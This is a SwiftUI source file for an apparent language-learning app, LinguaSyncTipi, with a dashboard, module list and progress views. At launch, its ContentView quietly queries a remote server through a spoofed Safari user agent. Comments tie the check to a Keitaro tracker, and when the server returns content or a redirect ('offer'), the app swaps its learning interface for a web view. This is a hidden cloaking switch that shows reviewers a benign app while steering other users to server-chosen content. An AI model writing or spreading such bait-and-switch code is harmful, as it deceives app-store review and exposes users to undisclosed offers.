//
//  ContentView.swift
//  LinguaSyncTipi
//
//  Created by Вячеслав on 10/15/25.
//

import SwiftUI

struct ContentView: View {
    @AppStorage("onboardingCompleted") private var onboardingCompleted = false
    @StateObject private var dataService = DataService.shared
    @StateObject private var progressService = ProgressService.shared
    
    @State var isFetched: Bool = false
    @AppStorage("isBlock") var isBlock: Bool = true
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                ProgressView()
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    Group {
                        if !onboardingCompleted {
                            OnboardingView()
                        } else {
                            MainTabView()
                        }
                    }
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            makeServerRequest()
        }
    }
    
    private func makeServerRequest() {
        
        let dataManager = DataManagers()
        
        guard let url = URL(string: dataManager.server) else {
            self.isBlock = false
            self.isFetched = true
            return
        }
        
        print("🚀 Making request to: \(url.absoluteString)")
        print("🏠 Host: \(url.host ?? "unknown")")
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = 5.0
        
        // Добавляем заголовки для имитации браузера
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
        request.setValue("ru-RU,ru;q=0.9,en;q=0.8", forHTTPHeaderField: "Accept-Language")
        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
        
        print("📤 Request Headers: \(request.allHTTPHeaderFields ?? [:])")
        
        // Создаем URLSession без автоматических редиректов
        let config = URLSessionConfiguration.default
        let session = URLSession(configuration: config, delegate: RedirectHandler(), delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            
            DispatchQueue.main.async {
                
                // Если есть любая ошибка (включая SSL) - блокируем
                if let error = error {
                    print("❌ Network error: \(error.localizedDescription)")
                    print("Server unavailable, showing block")
                    self.isBlock = true
                    self.isFetched = true
                    return
                }
                
                // Если получили ответ от сервера
                if let httpResponse = response as? HTTPURLResponse {
                    
                    print("📡 HTTP Status Code: \(httpResponse.statusCode)")
                    print("📋 Response Headers: \(httpResponse.allHeaderFields)")
                    
                    // Логируем тело ответа для диагностики
                    if let data = data, let responseBody = String(data: data, encoding: .utf8) {
                        print("📄 Response Body: \(responseBody.prefix(500))") // Первые 500 символов
                    }
                    
                    if httpResponse.statusCode == 200 {
                        // Проверяем, есть ли контент в ответе
                        let contentLength = httpResponse.value(forHTTPHeaderField: "Content-Length") ?? "0"
                        let hasContent = data?.count ?? 0 > 0
                        
                        if contentLength == "0" || !hasContent {
                            // Пустой ответ = "do nothing" от Keitaro
                            print("🚫 Empty response (do nothing): Showing block")
                            self.isBlock = true
                            self.isFetched = true
                        } else {
                            // Есть контент = успех
                            print("✅ Success with content: Showing WebView")
                            self.isBlock = false
                            self.isFetched = true
                        }
                        
                    } else if httpResponse.statusCode >= 300 && httpResponse.statusCode < 400 {
                        // Редиректы = успех (есть оффер)
                        print("✅ Redirect (code \(httpResponse.statusCode)): Showing WebView")
                        self.isBlock = false
                        self.isFetched = true
                        
                    } else {
                        // 404, 403, 500 и т.д. - блокируем
                        print("🚫 Error code \(httpResponse.statusCode): Showing block")
                        self.isBlock = true
                        self.isFetched = true
                    }
                    
                } else {
                    
                    // Нет HTTP ответа - блокируем
                    print("❌ No HTTP response: Showing block")
                    self.isBlock = true
                    self.isFetched = true
                }
            }
            
        }.resume()
    }
}

struct MainTabView: View {
    @StateObject private var dataService = DataService.shared
    @StateObject private var progressService = ProgressService.shared
    
    private let primaryColor = Color(hex: "#C80F2E")
    private let backgroundColor = Color(hex: "#FFFFFF")
    
    var body: some View {
        TabView {
            DashboardView()
                .tabItem {
                    Image(systemName: "house.fill")
                    Text("Home")
                }
            
            ModulesListView()
                .tabItem {
                    Image(systemName: "book.fill")
                    Text("Learn")
                }
            
            ProgressTrackerView()
                .tabItem {
                    Image(systemName: "chart.line.uptrend.xyaxis")
                    Text("Progress")
                }
            
            SettingsView()
                .tabItem {
                    Image(systemName: "gear")
                    Text("Settings")
                }
        }
        .accentColor(primaryColor)
        .background(backgroundColor)
    }
}

struct DashboardView: View {
    @StateObject private var dataService = DataService.shared
    @StateObject private var progressService = ProgressService.shared
    @StateObject private var progressViewModel = ProgressTrackerViewModel()
    
    private let primaryColor = Color(hex: "#C80F2E")
    private let backgroundColor = Color(hex: "#FFFFFF")
    
    var body: some View {
        NavigationView {
            ZStack {
                backgroundColor
                    .ignoresSafeArea()
                
                ScrollView {
                    VStack(spacing: 20) {
                        // Welcome Header
                        VStack(alignment: .leading, spacing: 8) {
                            HStack {
                                VStack(alignment: .leading) {
                                    Text("Welcome back!")
                                        .font(.title2)
                                        .foregroundColor(.secondary)
                                    
                                    Text("Ready to learn?")
                                        .font(.largeTitle)
                                        .fontWeight(.bold)
                                        .foregroundColor(primaryColor)
                                }
                                
                                Spacer()
                                
                                // Streak indicator
        VStack {
                                    Image(systemName: "flame.fill")
                                        .font(.title)
                                        .foregroundColor(.orange)
                                    
                                    Text("\(progressViewModel.getCurrentStreak())")
                                        .font(.headline)
                                        .fontWeight(.bold)
                                        .foregroundColor(primaryColor)
                                    
                                    Text("day streak")
                                        .font(.caption)
                                        .foregroundColor(.secondary)
                                }
                                .padding(12)
                                .background(Color.gray.opacity(0.1))
                                .cornerRadius(12)
                            }
                        }
                        .padding(.horizontal)
                        
                        // Weekly Progress Card
                        WeeklyProgressCard()
                            .padding(.horizontal)
                        
                        // Continue Learning Section
                        VStack(alignment: .leading, spacing: 12) {
                            HStack {
                                Text("Continue Learning")
                                    .font(.headline)
                                    .fontWeight(.bold)
                                    .foregroundColor(.primary)
                                
                                Spacer()
                                
                                NavigationLink("See All", destination: ModulesListView())
                                    .font(.subheadline)
                                    .foregroundColor(primaryColor)
                            }
                            .padding(.horizontal)
                            
                            ScrollView(.horizontal, showsIndicators: false) {
                                HStack(spacing: 16) {
                                    ForEach(dataService.languageModules.prefix(3)) { module in
                                        NavigationLink(destination: LearningModuleView(module: module)) {
                                            ModuleCard(module: module)
                                        }
                                        .buttonStyle(PlainButtonStyle())
                                    }
                                }
                                .padding(.horizontal)
                            }
                        }
                        
                        // Recent Achievements
                        if !progressViewModel.getRecentAchievements().isEmpty {
                            VStack(alignment: .leading, spacing: 12) {
                                Text("Recent Achievements")
                                    .font(.headline)
                                    .fontWeight(.bold)
                                    .foregroundColor(.primary)
                                    .padding(.horizontal)
                                
                                ScrollView(.horizontal, showsIndicators: false) {
                                    HStack(spacing: 12) {
                                        ForEach(progressViewModel.getRecentAchievements()) { badge in
                                            BadgeCard(badge: badge)
                                        }
                                    }
                                    .padding(.horizontal)
                                }
                            }
                        }
                        
                        // Motivational Message
                        VStack(spacing: 12) {
                            Text(progressViewModel.getMotivationalMessage())
                                .font(.title3)
                                .fontWeight(.medium)
                                .multilineTextAlignment(.center)
                                .foregroundColor(.primary)
                                .padding(.horizontal)
                            
                            if progressViewModel.getWeeklyProgressPercentage() < 1.0 {
                                Text("Keep going! You're doing great!")
                                    .font(.subheadline)
                                    .foregroundColor(.secondary)
                            }
                        }
                        .padding()
                        .background(Color.gray.opacity(0.1))
                        .cornerRadius(16)
                        .padding(.horizontal)
                    }
                    .padding(.vertical)
                }
            }
            .navigationTitle("LinguaSyncTipi")
            .navigationBarTitleDisplayMode(.large)
        }
    }
}

struct WeeklyProgressCard: View {
    @StateObject private var progressViewModel = ProgressTrackerViewModel()
    private let primaryColor = Color(hex: "#C80F2E")
    
    var body: some View {
        VStack(alignment: .leading, spacing: 16) {
            HStack {
                Text("This Week's Goal")
                    .font(.headline)
                    .fontWeight(.bold)
                    .foregroundColor(.primary)
                
                Spacer()
                
                Text("\(progressViewModel.getWeeklyProgress())/\(progressViewModel.getWeeklyGoal())")
                    .font(.subheadline)
                    .fontWeight(.medium)
                    .foregroundColor(primaryColor)
            }
            
            ProgressView(value: progressViewModel.getWeeklyProgressPercentage())
                .progressViewStyle(LinearProgressViewStyle(tint: primaryColor))
                .scaleEffect(x: 1, y: 2, anchor: .center)
            
            HStack {
                ForEach(progressViewModel.weeklyData) { day in
                    VStack(spacing: 4) {
                        Text(day.day)
                            .font(.caption2)
                            .foregroundColor(.secondary)
                        
                        Circle()
                            .fill(day.isCompleted ? primaryColor : Color.gray.opacity(0.3))
                            .frame(width: 12, height: 12)
                            .overlay(
                                Circle()
                                    .stroke(day.isToday ? primaryColor : Color.clear, lineWidth: 2)
                                    .frame(width: 16, height: 16)
                            )
                    }
                }
            }
            .frame(maxWidth: .infinity, alignment: .center)
        }
        .padding(20)
        .background(Color.gray.opacity(0.1))
        .cornerRadius(16)
    }
}

struct ModuleCard: View {
    let module: LanguageModule
    private let primaryColor = Color(hex: "#C80F2E")
    
    var body: some View {
        VStack(alignment: .leading, spacing: 12) {
            HStack {
                Text(module.language)
                    .font(.caption)
                    .fontWeight(.medium)
                    .foregroundColor(.white)
                    .padding(.horizontal, 8)
                    .padding(.vertical, 4)
                    .background(primaryColor)
                    .cornerRadius(8)
                
                Spacer()
                
                Text("\(module.estimatedTime) min")
                    .font(.caption)
                    .foregroundColor(.secondary)
            }
            
            Text(module.title)
                .font(.headline)
                .fontWeight(.bold)
                .foregroundColor(.primary)
                .lineLimit(2)
            
            Text(module.description)
                .font(.subheadline)
                .foregroundColor(.secondary)
                .lineLimit(3)
            
            Spacer()
            
            VStack(alignment: .leading, spacing: 8) {
                ProgressView(value: module.progress)
                    .progressViewStyle(LinearProgressViewStyle(tint: primaryColor))
                
                Text("\(Int(module.progress * 100))% Complete")
                    .font(.caption)
                    .foregroundColor(.secondary)
            }
        }
        .padding(16)
        .frame(width: 250, height: 180)
        .background(Color.gray.opacity(0.1))
        .cornerRadius(16)
    }
}

struct BadgeCard: View {
    let badge: Badge
    
    var body: some View {
        VStack(spacing: 8) {
            Image(systemName: badge.iconName)
                .font(.title)
                .foregroundColor(Color(hex: badge.color))
            
            Text(badge.name)
                .font(.caption)
                .fontWeight(.medium)
                .foregroundColor(.primary)
                .multilineTextAlignment(.center)
        }
        .padding(12)
        .frame(width: 80, height: 80)
        .background(Color.gray.opacity(0.1))
        .cornerRadius(12)
    }
}

struct ModulesListView: View {
    @StateObject private var dataService = DataService.shared
    private let primaryColor = Color(hex: "#C80F2E")
    private let backgroundColor = Color(hex: "#FFFFFF")
    
    var body: some View {
        NavigationView {
            ZStack {
                backgroundColor
                    .ignoresSafeArea()
                
                ScrollView {
                    LazyVStack(spacing: 16) {
                        ForEach(dataService.languageModules) { module in
                            NavigationLink(destination: LearningModuleView(module: module)) {
                                ModuleListCard(module: module)
                            }
                            .buttonStyle(PlainButtonStyle())
                        }
        }
        .padding()
                }
            }
            .navigationTitle("Language Modules")
            .navigationBarTitleDisplayMode(.large)
        }
    }
}

struct ModuleListCard: View {
    let module: LanguageModule
    private let primaryColor = Color(hex: "#C80F2E")
    
    var body: some View {
        HStack(spacing: 16) {
            // Language indicator
            VStack {
                Text(String(module.language.prefix(2)).uppercased())
                    .font(.headline)
                    .fontWeight(.bold)
                    .foregroundColor(.white)
            }
            .frame(width: 50, height: 50)
            .background(primaryColor)
            .cornerRadius(12)
            
            VStack(alignment: .leading, spacing: 8) {
                HStack {
                    Text(module.title)
                        .font(.headline)
                        .fontWeight(.bold)
                        .foregroundColor(.primary)
                    
                    Spacer()
                    
                    Text(module.difficulty.rawValue)
                        .font(.caption)
                        .fontWeight(.medium)
                        .foregroundColor(.white)
                        .padding(.horizontal, 8)
                        .padding(.vertical, 4)
                        .background(Color(hex: module.difficulty.color))
                        .cornerRadius(8)
                }
                
                Text(module.description)
                    .font(.subheadline)
                    .foregroundColor(.secondary)
                    .lineLimit(2)
                
                HStack {
                    Text("\(module.lessons.count) lessons")
                        .font(.caption)
                        .foregroundColor(.secondary)
                    
                    Text("•")
                        .foregroundColor(.secondary)
                    
                    Text("\(module.estimatedTime) min")
                        .font(.caption)
                        .foregroundColor(.secondary)
                    
                    Spacer()
                    
                    if module.isCompleted {
                        Image(systemName: "checkmark.circle.fill")
                            .foregroundColor(.green)
                    }
                }
                
                ProgressView(value: module.progress)
                    .progressViewStyle(LinearProgressViewStyle(tint: primaryColor))
            }
        }
        .padding(16)
        .background(Color.gray.opacity(0.1))
        .cornerRadius(16)
    }
}

#Preview {
    ContentView()
}
